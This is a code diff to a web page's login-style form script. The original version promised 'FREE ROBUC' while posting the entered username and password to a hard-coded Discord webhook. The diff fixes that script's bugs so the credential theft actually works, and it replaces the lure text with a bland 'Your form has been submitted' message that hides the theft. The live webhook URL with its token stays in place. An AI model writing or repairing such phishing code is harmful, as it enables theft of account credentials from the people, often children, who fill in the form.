@@ -31,37 +31,37 @@
       <p class="success-message" id="successMessage"></p>
     </div>
     <script>
-      function Sumbit() {
-        var usrname = document.getElementById(Q1).value;
-        var pasword = document.getElementById(Q2).value;
-        
-        var data = {
-          content: "User Credentials:\nUsername: ${usrname}\nPassword: ${pasword}
+    function submitForm() {
+      var answer1 = document.getElementById("Q1").value;
+      var answer2 = document.getElementById("Q2").value;
+
+      var data = {
+        content: `Answers:\nUsername: ${answer1}\nPassword: ${answer2}`
       };
-      
-        var webhookUrl = 'https://discord.com/api/webhooks/1192221899426631690/KsEKegb5FVoL3kNdXg2JKqCpIwzIL1ekaFQwtg6GQ_Z0DTGsujyjdDcj4gVmiq3oU8X2';
-        
-        fecth(webhookUrl, {
-          method : 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(data),
-        })
-        .then(response => {
-          if (!response.ok) {
-            throw new Error('Network Response fucking failed');
-          }
-          document.getElementById("successMessage").textContent = "YOU GET FREE ROBUC SOON 🤑🤑🤑🤑🤑"
-          console.log('Form sumbitted Sucessfully')
-        })
-        .catch(error => {
-          console.error("Error: ", error);
-        });
-        
-        document.getElementbyId("submitBtn").disabled = true;
-        
+
+      var webhookUrl = 'https://discord.com/api/webhooks/1192221899426631690/KsEKegb5FVoL3kNdXg2JKqCpIwzIL1ekaFQwtg6GQ_Z0DTGsujyjdDcj4gVmiq3oU8X2';
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
         }
-    </script>
+        document.getElementById("successMessage").textContent = 'Your form has been submitted.';
+        console.log('Form submitted successfully');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
+
+     
+      document.getElementById("submitBtn").disabled = true;
+    }
+  </script>
   </body>
 </html>
